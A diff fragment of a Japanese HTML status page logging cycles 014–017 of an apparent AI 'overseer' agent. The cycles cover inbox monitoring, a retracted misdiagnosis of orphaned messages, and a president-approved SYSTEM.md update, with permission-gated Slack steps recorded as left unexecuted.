+    <p class="text-sm text-gray-700">社長が開発エージェントの<strong>確定仕様</strong>を転送（11:55）→ <strong>O-013（往復切れ／孤児）は当方の事実誤認</strong>と判明＝<span class="font-mono">to: hp-loop</span> は正しい投函先（サーバ登録の窓口アドレス）、<span class="font-mono">hp-loop-yoshida</span> はループ名（<span class="font-mono">from</span>）で送信先未登録（<span class="font-mono">--to hp-loop-yoshida</span> は <span class="font-mono">unknown_recipient</span>）。当該 yoshida 報告は02:37 に日次ループが拾い再監査済＝実害なし。<strong>O-013 を訂正して決着</strong>（上の O-013 カード）し、誤検知の元となった <span class="font-mono">SYSTEM.md</span> 健康シグナルの訂正を <strong>O-014</strong>（最新レポートへ繰り越し・要承認）として起票。基盤は正常（<span class="font-mono">hold/</span> 空・孤児0）。<span class="font-mono">slack-poll</span> <span class="font-mono">reply/done</span> は未実行（→ Cycle 019 で単一根本原因 <strong>O-015</strong> として起票）。K-097 記録。</p>
+  </div>
+
+  <!-- Cycle 016 -->
+  <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 016 — 2026-06-26（軽い巡回・社長指示を反映）</h3>
+    <p class="text-sm text-gray-700">自分宛受信箱（<span class="font-mono">to: overseer</span> 2通＝社長の O-008/O-013 指示）・旧称 <span class="font-mono">to: hp-loop</span> 孤児の定点監視・<span class="font-mono">hold/</span> を確認。<strong>①O-008 を解決</strong>＝社長承認「直してください」を受け <span class="font-mono">SYSTEM.md</span> を <strong>v0.1→v0.2</strong> に同期（新モード chat・memo-triage・memo-intake・blog-loop・blog-write・blog-improve を追加／hp-loop を4サイト・v0.5／overseer v0.2／無人ディスパッチャ＋cron 節を新設／ツール群・チャネル・健康シグナルを拡充。実体を grep/Read で裏取り）。<strong>②O-013 を社長合意で決着</strong>（「映して再発時に再調査」＝実害なし）。<span class="font-mono">slack-poll</span> 権限ゲートで <span class="font-mono">fetch/reply/done</span> 未実行＝受信2通は <span class="font-mono">new/</span> 残置（内容は反映済）。K-096 記録。</p>
+  </div>
+
+  <!-- Cycle 015 -->
+  <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 015 — 2026-06-26（軽い巡回）</h3>
+    <p class="text-sm text-gray-700">Slack <span class="font-mono">fetch</span>（新着なし）・自分宛受信箱（O-013 回答1通）・旧称 <span class="font-mono">to: hp-loop</span> 孤児の定点監視・<span class="font-mono">hold/</span> を確認。<strong>O-013（往復切れ再発）を「実害なし」で一旦解決</strong>＝当該報告は本日02:37 に <span class="font-mono">hp-loop-yoshida</span> が拾い本番GET再監査完了済み、社長も「再発時に再調査」で合意。旧称孤児 <span class="font-mono">new/</span> 0件・<span class="font-mono">hold/</span> 空。→ <strong>Cycle 017（2026-06-26）で開発エージェントの確定仕様により前提を訂正</strong>：そもそも <span class="font-mono">to: hp-loop</span> は孤児でなく正しい投函先で、「往復切れ」自体が当方の事実誤認だった（上の O-013 訂正カード参照）。</p>
+  </div>
+
+  <!-- Cycle 014 -->
+  <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+    <h3 class="text-lg font-bold mb-1">Cycle 014 — 2026-06-26（精密診断）</h3>
+    <p class="text-sm text-gray-700">基盤は正常（無人ティック 2分毎 <span class="font-mono">status=ok</span>・全 idle＝chat/memo-triage/overseer/hp-loop:4サイト/blog:3モード、01:00 日次 overseer 起動・<span class="font-mono">hold/</span> 空）。<strong>O-013 を🔴起票</strong>：yoshida-dev の実装報告（R-Y06/R-Y15・本番デプロイ済）が旧称 <span class="font-mono">to: hp-loop</span> 宛で <span class="font-mono">new/</span> に「孤児化」と判定（約1日滞留）。<strong>※後に Cycle 017 でこの判定は事実誤認と訂正</strong>（<span class="font-mono">to: hp-loop</span> は正規投函先・日次が正常に拾う）。<strong>O-008 をさらに拡大</strong>（<span class="font-mono">grep yokohawaii SYSTEM.md</span>＝0件＝4サイト目も地図未記載）、<strong>O-009</strong> 未コミット45件に増加。K-087 記録（後に K-097 で「ドリフトを疑う前に宛名モデルを一次資料で確認」へ更新）。→ Cycle 015 で O-013 を実害なし解決、Cycle 016 で O-008 解決（SYSTEM.md v0.2 同期）。</p>
+  </div>
 
   <!-- Cycle 013 -->
   <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
